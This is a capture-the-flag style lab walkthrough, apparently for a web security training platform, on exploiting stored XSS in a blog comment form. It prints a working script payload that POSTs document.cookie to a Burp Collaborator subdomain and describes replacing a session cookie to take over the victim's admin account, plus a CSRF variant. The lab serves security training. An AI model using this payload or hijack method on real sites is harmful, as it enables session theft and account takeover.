# Lab 4: Exploiting cross-site scripting to steal cookies

## 📝 Lab Overview

A **stored XSS vulnerability** exists in the blog comment function. When a **simulated victim** views the comment, your malicious JavaScript executes. By exfiltrating their session cookie, you can **impersonate** the victim and access their account.

---

## 🚨 Important Notes

- 🚫 The platform firewall **blocks external interactions** — use **Burp Collaborator's default public server** only.
- 🛠️ There is a **less subtle alternative** method involving CSRF + cookie disclosure, but it's not recommended.

---

## 🛠️ Solution Steps

### 🔗 1. Get Burp Collaborator Payload

- Open **Burp Suite Professional**
- Go to the **Collaborator tab**
- Click **"Copy to clipboard"** to copy your unique **Collaborator subdomain**

---

### 💬 2. Submit the XSS Payload

Post a **comment** with the following payload (replacing `BURP-COLLABORATOR-SUBDOMAIN`):

```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
});
</script>

```

🧠 **How it works:**

When the victim views the comment, the script sends a `POST` request containing their cookie to your **Collaborator subdomain**.

---

### 📡 3. Capture the Cookie

- Go back to the **Collaborator tab**
- Click **"Poll now"**
- ✅ You should see an **HTTP interaction**
- Copy the **session cookie value** from the POST body

---

### 🧪 4. Hijack the Victim's Session

- In Burp, intercept a request to the **main blog** page or `/my-account`
- Replace **your session cookie** with the **victim’s cookie**
- Forward the request
- ✅ If successful, you’ll see the **admin user’s account page**

🎯 **This solves the lab!**

---

## 🔁 Alternative (Less Recommended)

Use the XSS to post the victim's cookie into another comment via **CSRF**.

⚠️ **Downsides:**

- Exposes the cookie publicly
- Leaves evidence of the attack

---

## 🎥 Community Solution

📺 [Watch on YouTube](https://youtu.be/N_87S9XVy0w)